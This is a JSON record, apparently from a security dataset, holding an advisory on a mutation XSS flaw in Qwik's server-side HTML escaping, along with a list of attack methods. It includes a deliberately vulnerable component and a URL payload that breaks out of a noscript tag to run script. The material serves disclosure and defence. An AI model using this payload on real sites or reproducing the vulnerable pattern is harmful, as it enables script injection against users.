{"description": "### Summary\n\nA potential mXSS vulnerability exists in Qwik for versions up to 1.6.0.\n\n### Details\n\nQwik improperly escapes HTML on server-side rendering. It converts strings according to the following rules:\n\nhttps://github.com/QwikDev/qwik/blob/v1.5.5/packages/qwik/src/core/render/ssr/render-ssr.ts#L1182-L1208\n\n- If the string is an attribute value:\n    - `\"` -> `&quot;`\n    - `&` -> `&amp;`\n    - Other characters -> No conversion\n- Otherwise:\n    - `<` -> `&lt;`\n    - `>` -> `&gt;`\n    - `&` -> `&amp;`\n    - Other characters -> No conversion\n\nIt sometimes causes the situation that the final DOM tree rendered on browsers is different from what Qwik expects on server-side rendering. This may be leveraged to perform XSS attacks, and a type of the XSS is known as mXSS (mutation XSS).\n\n## PoC\n\nA vulnerable component:\n```javascript\nimport { component$ } from \"@builder.io/qwik\";\nimport { useLocation } from \"@builder.io/qwik-city\";\n\nexport default component$(() => {\n  \n  // user input\n  const { url } = useLocation();\n  const href = url.searchParams.get(\"href\") ?? \"https://example.com\";\n\n  return (\n    <div>\n      <noscript>\n        <a href={href}>test</a>\n      </noscript>\n    </div>\n  );\n});\n```\n\nIf a user accesses the following URL,\n```\nhttp://localhost:4173/?href=</noscript><script>alert(123)</script>\n```\nthen, `alert(123)` will be executed.\n\n### Impact\n\nXSS", "methods": ["Used a vulnerable component to inject malicious JavaScript code.", "Injected malicious JavaScript code through a URL parameter.", "Leveraged a noscript tag to execute malicious code.", "Used a mutation XSS attack."]}